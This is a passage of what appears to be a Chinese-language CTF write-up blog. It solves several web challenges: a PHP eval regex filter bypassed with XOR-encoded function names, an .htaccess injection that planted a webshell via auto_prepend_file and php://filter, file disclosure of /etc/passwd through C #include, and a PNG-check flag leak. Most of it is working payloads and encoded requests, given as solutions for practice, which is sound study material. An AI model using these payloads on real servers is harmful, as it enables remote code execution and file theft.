</span></span><span class="line"><span class="cl"><span class="nv">$_</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[\x00- 0-9\&#39;&#34;`$&amp;.,|[{_defgops\x7F]+/i&#39;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;ros√© will not do it&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">count_chars</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$_</span><span class="p">),</span> <span class="mh">0x3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mh">0xd</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;you are so close, omg&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\x00- 0-9                       ÂåπÈÖç\x00Âà∞Á©∫Ê†º(\x20)Ôºå0-9ÁöÑÊï∞Â≠ó
</span></span><span class="line"><span class="cl">&#39;&#34;`$&amp;.,|[{_defgops              ÂåπÈÖçËøô‰∫õÂ≠óÁ¨¶
</span></span><span class="line"><span class="cl">\x7F                            ÂåπÈÖçDEL(\x7F)Â≠óÁ¨¶
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ãÈù¢Ëøô‰∏™‰ºöÁªüËÆ°Áî®ËøáÁöÑ‰∏çÂêåÂ≠óÁ¨¶ÔºåË∂ÖËøá13‰∏™Ë¢´waf</p>
<p>Âà©Áî®Â≠óÁ¨¶‰∏≤ÂºÇÊàñ</p>
<p>ÂÖàÁ°ÆÂÆöËá™Â∑±ÊÉ≥ÊâßË°åÁöÑËØ≠Âè•ÔºåÊØîÂ¶ÇphpinfoÔºåÁÑ∂ÂêéÂÆö‰∏Ä‰∏™ÂèÇËÄÉÂ≠óÁ¨¶‰∏≤ÔºåËÆ©phpinfoÂíåÂÆÉÂºÇÊàñÔºåÂ∞±ÂèØ‰ª•ÂæóÂà∞ÊÉ≥Ë¶ÅÁöÑËæìÂÖ•ÔºåÂ¶ÇÊûúÂæóÂà∞ÁöÑÁªìÊûú‰∏çÁ¨¶ÂêàË¶ÅÊ±ÇÔºåÂÜçÂæÆË∞ÉÂèÇËÄÉÂ≠óÁ¨¶‰∏≤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">p:%8f^%ff
</span></span><span class="line"><span class="cl">h:%97^%ff
</span></span><span class="line"><span class="cl">i:%96^%ff
</span></span><span class="line"><span class="cl">n:%91^%ff
</span></span><span class="line"><span class="cl">f:%99^%ff
</span></span><span class="line"><span class="cl">o:%90^%ff
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;phpinfo&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">standard</span> <span class="o">=</span> <span class="mh">0xff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dicts</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">dicts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">^</span><span class="n">standard</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="s1">&#39;%&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">res</span><span class="o">+</span><span class="n">dicts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">+</span><span class="s1">&#39;^&#39;</span><span class="o">+</span><span class="s2">&#34;</span><span class="si">%f</span><span class="s2">f&#34;</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">res</span><span class="o">+</span><span class="s1">&#39;^&#39;</span><span class="o">+</span><span class="s2">&#34;</span><span class="si">%f</span><span class="s2">f&#34;</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">))))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(&#39;.&#39;))
</span></span><span class="line"><span class="cl">(%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%9c%9e%91%9b%96%8d^%ff%ff%ff%ff%ff%ff%ff)((%d1^%ff)));
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë¶ÅÊâæÂà∞ÂèØ‰ª•ÊõøÊç¢ÁöÑÔºåÂç≥Âú®ÂÜÖÈÉ®ÂèØ‰ª•‰∫íÁõ∏ÂºÇÊàñÂá∫Êù•ÁöÑÔºåÊâçËÉΩ‰ΩøÈáçÂ§çÁöÑÂèòÂ∞ë</p>
<p>ÊúÄÂêé</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(&#39;.&#39;))
</span></span><span class="line"><span class="cl">(%8f%8d%9c%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff^%ff%ff%9b%ff%ff%ff%ff^%ff%ff%91%ff%ff%ff%ff)((%9c%9c%8d%91%9b%9c%8d^%ff%ff%ff%ff%ff%ff%ff^%9b%ff%9c%ff%ff%9b%ff^%8b%ff%8f%ff%ff%91%ff)((%d1^%ff)));
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">readfile(end(scandir(&#39;.&#39;)))
</span></span><span class="line"><span class="cl">((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÁæäÂüéÊùØ2020easyphp">[ÁæäÂüéÊùØ2020]easyphp
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;on&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;html&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[^a-z\.]/&#34;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Hello, world&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂà©Áî®Âà∞‰πãÂâçÂ≠¶‰π†hatccessÊñá‰ª∂ÁöÑ‰ΩúÁî®ÔºåÂåÖÂê´index.php,ÂèçÊñúÊù†ÁªïËøáÊ≠£Âàô</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_fi\
</span></span><span class="line"><span class="cl">le .htaccess
</span></span><span class="line"><span class="cl">#&lt;?php system(&#39;ls /&#39;);?&gt;\
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êç¢Ë°åÁî®urlÁºñÁ†Å‰∏Ä‰∏ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20.htaccess%0A%23%3C?php%20system(&#39;ls%20/&#39;);?%3E\
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖÂà©Áî®‰∏äÊ¨°Â≠¶Âà∞ÁöÑ.htaccessÊñá‰ª∂ÁªïËøáprceÈôêÂà∂ÁöÑÊñπÊ≥ïÂÜôÈ©¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value pcre.backtrack_limit 0
</span></span><span class="line"><span class="cl">php_value pcre.jit 0
</span></span><span class="line"><span class="cl"># \
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename=.htaccess
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;1=phpinfo();
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="fireshellctf2020caas">[FireshellCTF2020]Caas
</h2><p>cËØ≠Ë®ÄÁºñËØëÊä•Èîô</p>
<p>Âà©Áî®#includeÊù•Êñá‰ª∂ÂåÖÂê´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &#34;/etc/passwd&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ¥Êé•ÂåÖÂê´flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &#34;/flag&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="harekazectf2019avatar-uploader-1">[HarekazeCTF2019]Avatar Uploader 1
</h2><p>ÂéüÈ¢òÁªô‰∫ÜÊ∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;config.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;lib/util.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;lib/session.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$session</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SecureClientSession</span><span class="p">(</span><span class="nx">CLIENT_SESSION_ID</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// check whether file is uploaded
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;No file was uploaded.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// check file size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">256000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Uploaded file is too large.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// check file type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$finfo</span> <span class="o">=</span> <span class="nx">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME_TYPE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$type</span> <span class="o">=</span> <span class="nx">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nx">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;image/png&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Uploaded file is not PNG format.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// check file width/height
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$size</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$size</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">256</span> <span class="o">||</span> <span class="nv">$size</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Uploaded image is too large.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$size</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">IMAGETYPE_PNG</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// I hope this never happens...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#39;</span> <span class="o">.</span> <span class="nx">getenv</span><span class="p">(</span><span class="s1">&#39;FLAG1&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/code&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ok
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$filename</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">random_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;.png&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$session</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;avatar&#39;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">flash</span><span class="p">(</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="s1">&#39;Your avatar has been successfully updated!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁî®Âà∞finfo_fileÊ£ÄÊµãÂõæÁâáÁ±ªÂûãÔºåÁÑ∂ÂêégetimagesizeÂà§Êñ≠Êñá‰ª∂ÂÉèÁ¥†Â§ßÂ∞èÔºåÂπ∂‰∏îÂÜçËøõË°å‰∏ÄÊ¨°Á±ªÂûãÂà§Êñ≠ÔºåÂ¶ÇÊûú‰∏çÊòØ png Á±ªÂûãÂ∞±ÁªôÂá∫ flagÔºåÊàë‰ª¨Áõ¥Êé•010ÊûÑÈÄ†‰∏Ä‰∏™Âè™ÊúâpngÂ§¥ÁöÑÂõæÁâá,ÂéªmiscÈ¢òÈáåÈù¢Êâæ‰∏Ä‰∏™pngÂõæÁâáÔºåÊääÊñá‰ª∂Â§¥‰∏ãÈù¢ÂÖ®Âà†‰∫Ü</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250424143945904.png"
	width="982"
	height="746"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250424143945904_hu18066822231927187810.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250424143945904_hu10792788343392870505.png 1024w"
	loading="lazy"
	
		alt="image-20250424143945904"
	
	
		class="gallery-image" 
		data-flex-grow="131"
		data-flex-basis="315px"
	
></p>
